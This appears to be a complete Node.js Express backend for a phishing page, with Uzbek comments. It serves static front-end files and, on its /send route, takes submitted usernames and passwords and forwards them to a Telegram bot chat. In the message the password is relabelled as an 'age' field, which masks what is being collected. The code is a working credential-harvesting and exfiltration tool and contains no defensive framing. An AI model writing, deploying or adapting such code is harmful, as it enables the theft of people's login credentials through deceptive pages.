require("dotenv").config();

const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const app = express();

// Static fayllar (HTML, CSS, JS)
app.use(express.static(__dirname));
app.use(bodyParser.json());

// 🔥 Environment Variables orqali olish
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// / route - server ishlayotganini tekshirish
app.get("/", (req, res) => {
    res.send("✅ Server ishlayapti!");
});

// /send route - frontenddan kelgan ma'lumotni Telegramga yuborish
app.post("/send", async (req, res) => {
    // 🌟 Kerakli o‘zgarish: ism/yosh o‘rniga username/age ishlatildi
    const { username, password } = req.body;

    // Telegramga yuboriladigan xabar
    const message = `🔐 Sizga yangi habar keldi:\nIsm: ${username}\nYosh: ${password}`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message
        });

        res.sendStatus(200); // muvaffaqiyatli yuborildi
    } catch (err) {
        console.error("Xato:", err.message);
        res.sendStatus(500); // xatolik yuz berdi
    }
});

// Port sozlamalari
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server ${PORT}-portda ishlayapti`);
});
